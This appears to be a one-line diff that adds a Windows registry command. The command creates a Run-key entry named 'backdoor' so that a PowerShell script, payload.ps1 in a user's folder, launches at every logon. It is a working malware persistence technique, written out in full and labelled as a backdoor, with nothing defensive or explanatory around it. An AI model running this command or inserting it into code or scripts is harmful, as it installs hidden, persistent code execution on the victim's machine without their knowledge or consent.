@@ -1,0 +1,1 @@
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "powershell.exe C:\Users\SOMAYA\payload.ps1"
